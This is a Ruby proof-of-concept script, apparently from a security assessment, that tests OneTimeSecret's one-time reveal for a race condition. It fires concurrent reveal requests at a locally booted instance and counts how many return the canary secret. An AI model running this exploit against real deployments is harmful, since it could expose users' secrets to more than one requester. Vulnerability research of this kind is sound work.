# PoC: TOCTOU race in the one-time guarantee (in-process, full stack).
# Boots OneTimeSecret in-process and drives the REAL otto->logic->model->Redis
# reveal path concurrently via Rack::MockRequest. A correct one-time store
# returns the plaintext to AT MOST ONE requester. >1 proves the race.
#
# Run: ruby race_reveal_inproc.rb [CONCURRENCY] [TRIALS]

# Force UTF-8 regardless of container locale (config.ru contains an em-dash).
Encoding.default_external = Encoding::UTF_8
Encoding.default_internal = Encoding::UTF_8

ENV['RACK_ENV']                 ||= 'development'
ENV['ONETIME_HOME']               = '/home/user/onetimesecret'
ENV['SECRET']                   ||= File.read('/home/user/security-assessment/notes/.test_secret').strip
ENV['REDIS_URL']                ||= 'redis://127.0.0.1:6379/0'
ENV['IDENTIFIER_SECRET']        ||= 'a' * 64
ENV['VERIFIABLE_ID_HMAC_SECRET']||= ENV['IDENTIFIER_SECRET']
ENV['HOST']                     ||= 'localhost:3000'
ENV['SSL']                      ||= 'false'

$LOAD_PATH.unshift('/home/user/onetimesecret/lib')
require 'onetime'
OT.execution_mode = :backend
Onetime.boot! :app
Onetime::Application::Registry.prepare_application_registry
APP = Onetime::Application::Registry.generate_rack_url_map

require 'rack/mock'
require 'json'
require 'uri'

CONC   = (ARGV[0] || 25).to_i
TRIALS = (ARGV[1] || 5).to_i

def http(method, path, params = {})
  body = URI.encode_www_form(params)
  env  = Rack::MockRequest.env_for(
    path,
    method: method,
    input: body,
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded',
    'REMOTE_ADDR'  => '127.0.0.1',
  )
  status, _h, b = APP.call(env)
  s = +''
  b.each { |c| s << c }
  b.close if b.respond_to?(:close)
  [status, s]
end

def conceal(plaintext)
  st, resp = http('POST', '/api/v2/secret/conceal',
                  'secret[secret]' => plaintext, 'secret[ttl]' => '3600')
  data = JSON.parse(resp) rescue {}
  sec  = data.dig('record', 'secret') || {}
  sid  = sec['identifier'] || sec['secret_identifier'] || sec['key'] || sec['objid']
  [st, sid, resp]
end

# Sanity: show the conceal response shape once.
st, sid, resp = conceal("SHAPE-CHECK")
puts "[conceal] status=#{st} id=#{sid.inspect}"
puts "[conceal] body (first 600B): #{resp[0, 600]}"
abort "Could not conceal/extract id; aborting." unless sid

overall_vuln = false
TRIALS.times do |t|
  canary = "RACE-CANARY-#{Time.now.to_i}-#{t}-#{rand(1_000_000)}"
  _st, sid, _ = conceal(canary)
  gate = Queue.new                       # barrier: release all threads at once
  hits = Queue.new
  threads = CONC.times.map do
    Thread.new do
      gate.pop                           # wait for the starting gun
      st, body = http('POST', "/api/v2/secret/#{sid}/reveal", 'continue' => 'true')
      hits << 1 if st == 200 && body.include?(canary)
    end
  end
  sleep 0.05
  CONC.times { gate << :go }             # fire simultaneously
  threads.each(&:join)
  n = hits.size
  overall_vuln ||= n > 1
  puts "[trial #{t + 1}/#{TRIALS}] id=#{sid[0,12]}…  reveals_returning_plaintext=#{n}/#{CONC}  #{n > 1 ? 'VULNERABLE' : 'ok'}"
end

puts "============================================================"
puts overall_vuln ?
  "[RESULT] VULNERABLE — one-time guarantee broken: a single secret was revealed to >1 concurrent requester." :
  "[RESULT] No double-reveal observed in this run (try higher concurrency)."
